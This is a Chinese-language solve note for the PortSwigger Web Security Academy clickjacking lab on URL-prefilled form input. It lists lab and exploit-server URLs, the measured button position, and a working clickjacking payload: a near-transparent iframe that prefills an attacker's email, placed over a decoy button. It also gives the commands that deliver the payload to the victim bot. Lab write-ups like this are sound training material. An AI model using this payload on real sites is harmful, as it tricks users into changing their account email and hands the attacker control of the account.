---
title: "lab-prefilled-form-input"
links:
  - target: clickjacking-family
    relation: evidences
---

# lab-prefilled-form-input

> evidences: [[clickjacking-family]]

- 题面:Clickjacking with form input data prefilled from a URL parameter(/web-security/clickjacking/lab-prefilled-form-input)
- 实例:https://0ad5007a047253ed802726e900a900b8.web-security-academy.net(`wiener:peter`)
- 利用服务器:https://exploit-0a2700cd04185325800325e901850061.exploit-server.net
- 判定目标:诱导受害者点击后把邮箱改成攻击者值(邮箱由 URL 参数预填);状态:**solved**(回马枪;交付后 solved_check true)

## 已确认

1. `/my-account?email=<值>` 预填 change-email 表单 email 输入(实测 input value = 参数值);
   表单 POST `/my-account/change-email`(email + csrf),按钮 "Update email"。
2. 量得按钮矩形(视口 500x700):**Update email @ (32, 491.66, 152, 33)**。
3. exploit:iframe(500x700,opacity 0.0001,z-index 2)指向 `/my-account?email=attacker@evil-user.net`,
   诱饵 `<button id=d>Click me</button>`(z-index 1)覆盖按钮。
4. **本次 solves**:交付(`--follow`)后 `solved_check` true(同时挂了 `/beacon` 顶层点击信标,无命中 → bot 为坐标点击)。

## 关键更正(相对 16:17 的 stuck 版)

- 旧结论“本地能改邮箱、bot 不行(bot 元素级点击)”**不成立**:加顶层点击信标后无命中而 lab solved,
  证明 bot 是坐标点击、且点进了 iframe。此题的 stuck 当属旧实例/交付链问题,非点击语义。
- 结构与本批均成功:`<button>` 诱饵 + 半透明 iframe 在上(z-index 2)。

## 证据摘录

```
solved_check "https://0ad5007a047253ed802726e900a900b8.web-security-academy.net/" --jar /tmp/b15c-jar1.json
 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
exploit 服务器 banner 亦由 is-notsolved 变 is-solved。
```

## 复现命令

```
lab_launch launch 8A7EC1665250F513F8AB3C341F7FCEF5402A497D59FA90E673BFD30CD47FF766 --widget-source /web-security/clickjacking/lab-prefilled-form-input --jar /tmp/b15c-jar1.json
lab_http post "https://<exploit>/" --form urlIsHttps=on --form responseFile=/exploit --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' \
  --form 'responseBody=<button id=d style="position:fixed;left:32px;top:491px;width:152px;height:33px;z-index:1">Click me</button><iframe src="https://<inst>/my-account?email=attacker@evil-user.net" style="position:fixed;left:0;top:0;width:500px;height:700px;opacity:0.0001;z-index:2;border:0"></iframe>' \
  --form formAction=DELIVER_TO_VICTIM --follow
solved_check "<inst>/" --jar /tmp/b15c-jar1.json
```
